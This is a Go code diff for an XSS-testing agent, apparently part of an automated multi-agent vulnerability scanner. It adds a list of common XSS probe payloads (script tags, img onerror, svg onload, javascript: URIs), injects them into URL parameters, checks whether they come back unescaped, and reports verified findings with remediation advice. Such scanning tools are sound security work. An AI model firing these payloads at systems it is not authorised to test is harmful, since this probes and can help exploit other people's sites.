@@ -12,6 +12,7 @@ import (
 	"fmt"
 	"log"
 	"net/url"
+	"runtime/debug"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -58,7 +59,15 @@ func (x *XSSSpecialist) OnEvent(event bus.Event) {
 	// Only process commands directed to this agent
 	if event.Type == bus.Command && event.ToAgent == x.id {
 		log.Printf("[%s] Received command: %v\n", x.id, event.Payload)
-		go x.executeTask(event)
+		go func() {
+			defer func() {
+				if rec := recover(); rec != nil {
+					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", x.id, rec, debug.Stack())
+					x.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
+				}
+			}()
+			x.executeTask(event)
+		}()
 	}
 }
 
@@ -183,7 +192,17 @@ func (x *XSSSpecialist) reportCandidateIfFound(analysis string) {
 		fullURL = location
 	}
 
-	// Create candidate
+	// Attempt exploitation before reporting
+	if parameter != "" && fullURL != "" {
+		log.Printf("[%s] Attempting XSS exploitation on parameter: %s\n", x.id, parameter)
+		if x.exploitXSS(fullURL, parameter) {
+			// Exploitation successful - report as Finding (verified)
+			x.reportFinding(fullURL, parameter, reasoning)
+			return
+		}
+	}
+
+	// Exploitation failed - report as Candidate (unverified)
 	candidate := reporter.VulnerabilityCandidate{
 		Type:      "XSS",
 		URL:       fullURL,
@@ -204,6 +223,86 @@ func (x *XSSSpecialist) reportCandidateIfFound(analysis string) {
 		Payload:   string(candidateJSON),
 	}
 	x.bus.Publish("Reporter-01", event)
+}
+
+// exploitXSS attempts to exploit an XSS vulnerability by injecting payloads
+func (x *XSSSpecialist) exploitXSS(targetURL, parameter string) bool {
+	// Common XSS payloads for reflection testing
+	payloads := []string{
+		"<script>alert('XSS')</script>",
+		"<img src=x onerror=alert('XSS')>",
+		"<svg onload=alert('XSS')>",
+		"'\"><script>alert('XSS')</script>",
+		"javascript:alert('XSS')",
+	}
+
+	for _, payload := range payloads {
+		// Construct test URL with payload
+		testURL, err := x.injectPayload(targetURL, parameter, payload)
+		if err != nil {
+			log.Printf("[%s] Failed to construct test URL: %v\n", x.id, err)
+			continue
+		}
+
+		// Replace localhost for Docker
+		dockerURL := x.replaceLocalhostForDocker(testURL)
+
+		// Send HTTP request
+		response, err := tools.SimpleHTTPGet(x.ctx, x.executor, dockerURL)
+		if err != nil {
+			log.Printf("[%s] HTTP request failed for payload test: %v\n", x.id, err)
+			continue
+		}
+
+		// Check if payload is reflected in response (unescaped)
+		if strings.Contains(response, payload) {
+			log.Printf("[%s] ✅ XSS VERIFIED: Payload reflected unescaped: %s\n", x.id, payload)
+			return true
+		}
+	}
+
+	log.Printf("[%s] ❌ XSS exploitation failed: No payload reflected\n", x.id)
+	return false
+}
+
+// injectPayload injects the XSS payload into the target URL parameter
+func (x *XSSSpecialist) injectPayload(targetURL, parameter, payload string) (string, error) {
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return "", err
+	}
+
+	// Get existing query parameters
+	query := parsedURL.Query()
+
+	// If parameter exists, replace it; otherwise add it
+	query.Set(parameter, payload)
+
+	parsedURL.RawQuery = query.Encode()
+	return parsedURL.String(), nil
+}
+
+// reportFinding reports a verified XSS vulnerability
+func (x *XSSSpecialist) reportFinding(targetURL, parameter, evidence string) {
+	finding := reporter.VulnerabilityFinding{
+		Type:        "XSS",
+		Severity:    "High",
+		URL:         targetURL,
+		Payload:     parameter,
+		Description: fmt.Sprintf("XSS vulnerability verified on parameter '%s'. Evidence: %s. Recommendation: Implement proper input sanitization and output encoding. Use Content Security Policy (CSP) headers.", parameter, evidence),
+		Timestamp:   time.Now().Format(time.RFC1123),
+	}
+
+	findingJSON, _ := json.Marshal(finding)
+	event := bus.Event{
+		ID:        fmt.Sprintf("%s-finding-%d", x.id, xssMessageCounter.Add(1)),
+		FromAgent: x.id,
+		ToAgent:   "Reporter-01",
+		Type:      bus.Finding,
+		Payload:   string(findingJSON),
+	}
+	x.bus.Publish("Reporter-01", event)
+	log.Printf("[%s] 🎯 Reported verified XSS finding: %s (param: %s)\n", x.id, targetURL, parameter)
 }
 
 func (x *XSSSpecialist) reportObservation(toAgent string, observation string) {
